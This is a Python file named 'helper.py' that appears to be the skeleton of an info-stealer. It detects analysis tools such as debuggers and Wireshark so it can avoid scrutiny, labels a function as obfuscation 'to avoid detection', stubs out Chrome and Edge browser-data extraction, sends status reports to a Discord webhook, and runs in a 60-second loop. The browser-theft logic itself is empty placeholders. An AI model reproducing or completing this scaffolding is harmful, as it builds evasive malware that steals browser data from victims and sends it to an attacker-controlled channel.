# helper.py
import requests
import os
import base64
import subprocess
import json
import time
from cryptography.fernet import Fernet
from config import DISCORD_WEBHOOK_URL

# Data storage
DATA_FILE = 'data.json'

# Ensure data file exists
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump({}, f)

# Load data
def load_data():
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

# Save data
def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f)

# Encryption key management
# In a real app, you'd want to persist this key instead of generating it every time
# so that data encrypted in one session can be decrypted in another.
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Encrypt data
def encrypt_data(data):
    encrypted_data = cipher_suite.encrypt(data.encode())
    return base64.b64encode(encrypted_data).decode()

# Decrypt data
def decrypt_data(encrypted_data):
    try:
        decrypted_data = cipher_suite.decrypt(base64.b64decode(encrypted_data.encode()))
        return decrypted_data.decode()
    except Exception:
        return None

# Obfuscated code to avoid detection
def obfuscated_function():
    encoded_data = base64.b64encode(b'Your secret data')
    decoded_data = base64.b64decode(encoded_data)
    return decoded_data

# Function to check for blacklisted processes
def check_blacklisted_processes():
    # Common analysis tools
    blacklisted_processes = ['xdbg', 'ollydbg', 'FakeNet', 'wireshark', 'tcpdump']
    try:
        # Replit is Linux-based
        output = subprocess.check_output(['ps', 'aux']).decode().lower()
        for process in blacklisted_processes:
            if process.lower() in output:
                return True
    except Exception:
        pass
    return False

# Function to extract browser data (Placeholders)
def extract_browser_data(browser):
    # Log the attempt for debugging/tracing
    print(f"Attempting to extract data from {browser}...")
    if browser == 'chrome':
        # Logic for Chrome would go here
        pass
    elif browser == 'edge':
        # Logic for Edge would go here
        pass

# Function to send data to Discord
def send_to_discord(message):
    if not DISCORD_WEBHOOK_URL:
        print("Discord Webhook URL not configured.")
        return
    data = {'content': f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}"}
    try:
        response = requests.post(
            DISCORD_WEBHOOK_URL, 
            data=json.dumps(data), 
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        response.raise_for_status()
    except Exception as e:
        print(f"Failed to send to Discord: {e}")

# Main function to execute activities
def main():
    if not check_blacklisted_processes():
        # Perform activities
        extract_browser_data('chrome')
        extract_browser_data('firefox')
        
        # Send status update
        send_to_discord("System check passed. Activities executed.")
        
        # Update persistent state
        data = load_data()
        data['status'] = 'active'
        data['last_run'] = time.time()
        save_data(data)
    else:
        print("Analysis environment detected. Skipping execution.")

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            print(f"Error in main loop: {e}")
        time.sleep(60)  # Run every 60 seconds
